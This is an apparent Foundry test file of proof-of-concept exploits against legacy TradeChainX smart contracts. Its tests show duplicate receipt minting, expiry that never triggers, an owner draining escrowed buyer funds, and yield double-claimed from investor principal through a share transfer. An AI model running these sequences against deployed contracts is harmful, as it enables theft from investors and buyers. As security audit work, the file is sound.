// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {WarehouseReceiptNFT} from "../legacy/WarehouseReceiptNFT.sol";
import {MarketplaceUpgradeable} from "../legacy/Marketplace.sol";
import {TXCToken} from "../legacy/TXCToken.sol";
import {XOwnAssetManager} from "../legacy/XOwnAssetManager.sol";

/// Proof-of-concept tests against the ORIGINAL TradeChainX contracts.
/// Each test PASSES when the issue is present.
contract LegacyIssuesTest is Test {
    address owner = makeAddr("owner");
    address anyone = makeAddr("anyone");
    address buyer = makeAddr("buyer");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    TXCToken txc;
    WarehouseReceiptNFT wr;
    MarketplaceUpgradeable mkt;

    function setUp() public {
        vm.warp(1_780_000_000);
        txc = new TXCToken();
        vm.prank(owner);
        txc.initialize(owner);
        wr = new WarehouseReceiptNFT();
        vm.prank(owner);
        wr.initialize(owner);
        vm.prank(owner);
        mkt = new MarketplaceUpgradeable();
        vm.prank(owner);
        mkt.initialize(address(txc), owner);
    }

    function _mintReceipt(address to, string memory uri) internal returns (uint256 tokenId) {
        vm.prank(to);
        wr.submitReceiptDetails(100, uri, 1_000e18);
        uint256 sid = wr.getPendingSubmissionIds()[wr.getPendingSubmissionIds().length - 1];
        vm.prank(owner);
        wr.processSubmission(sid, true);
        vm.prank(to);
        tokenId = wr.mint(sid);
    }

    /// Anyone (no warehouse check) can submit; the same receipt can be tokenised twice.
    function test_Legacy_NoIssuerCheckAndDuplicatesAllowed() public {
        uint256 a = _mintReceipt(anyone, "ipfs://same-receipt");
        uint256 b = _mintReceipt(anyone, "ipfs://same-receipt");
        assertEq(wr.ownerOf(a), anyone);
        assertEq(wr.ownerOf(b), anyone);
        assertEq(wr.tokenURI(a), wr.tokenURI(b));
    }

    /// Expiry is computed as issuedTime + expiryTime, but expiryTime is already absolute,
    /// so a 180-day receipt still lists as live after 400 days and can never be liquidated.
    function test_Legacy_ExpiryNeverTriggers() public {
        uint256 id = _mintReceipt(anyone, "ipfs://r");
        vm.warp(block.timestamp + 400 days);
        vm.startPrank(anyone);
        wr.approve(address(mkt), id);
        uint256 listingId = mkt.createListing(address(wr), id, 1, 500e18, MarketplaceUpgradeable.TokenType.Warehouse, true);
        vm.stopPrank();
        assertFalse(mkt.isExpired(listingId));
        vm.expectRevert("Asset not expired yet");
        mkt.liquidate(listingId);
    }

    /// With escrow on, buyer funds sit in the marketplace, and the owner can withdraw them.
    function test_Legacy_OwnerCanWithdrawEscrowedBuyerFunds() public {
        vm.prank(owner);
        mkt.updateIsEscrowActive(true);
        uint256 id = _mintReceipt(anyone, "ipfs://r");
        vm.startPrank(anyone);
        wr.approve(address(mkt), id);
        uint256 listingId = mkt.createListing(address(wr), id, 1, 500e18, MarketplaceUpgradeable.TokenType.Warehouse, true);
        vm.stopPrank();

        vm.prank(owner);
        txc.transfer(buyer, 1_000e18);
        vm.startPrank(buyer);
        txc.approve(address(mkt), type(uint256).max);
        mkt.buy(listingId, 1);
        vm.stopPrank();
        assertEq(mkt.getTotalEscrowedAmount(), 500e18);

        vm.prank(owner);
        mkt.withdrawTokens(owner, 500e18); // takes the buyer's escrowed payment
        assertEq(txc.balanceOf(address(mkt)), 0);

        vm.prank(buyer);
        mkt.approveAndReleaseEscrow(1);
        vm.prank(anyone);
        vm.expectRevert(); // seller can never be paid
        mkt.approveAndReleaseEscrow(1);
    }

    /// XOwn: distributeYield moves no money (it's paid from investor principal), and the same
    /// yield can be claimed again by passing shares to a second wallet.
    function test_Legacy_XOwnYieldDoubleClaimFromPrincipal() public {
        vm.prank(owner);
        XOwnAssetManager x = new XOwnAssetManager(address(txc));
        vm.prank(owner);
        uint256 assetId = x.createAsset(100, 1e18, "ipfs://tractor", block.timestamp + 365 days, 12);

        vm.prank(owner);
        txc.transfer(alice, 100e18);
        vm.startPrank(alice);
        txc.approve(address(x), type(uint256).max);
        x.invest(assetId, 100); // contract now holds 100 TXC of principal
        vm.stopPrank();

        vm.prank(owner);
        x.distributeYield(assetId, 10e18); // no tokens are sent in
        assertEq(txc.balanceOf(address(x)), 100e18);

        vm.prank(alice);
        x.claimYield(assetId); // 10 TXC
        vm.prank(alice);
        x.safeTransferFrom(alice, bob, assetId, 100, "");
        vm.prank(bob);
        x.claimYield(assetId); // another 10 TXC for the same distribution

        assertEq(txc.balanceOf(alice) + txc.balanceOf(bob), 20e18);
        assertEq(txc.balanceOf(address(x)), 80e18); // paid out of principal
    }
}
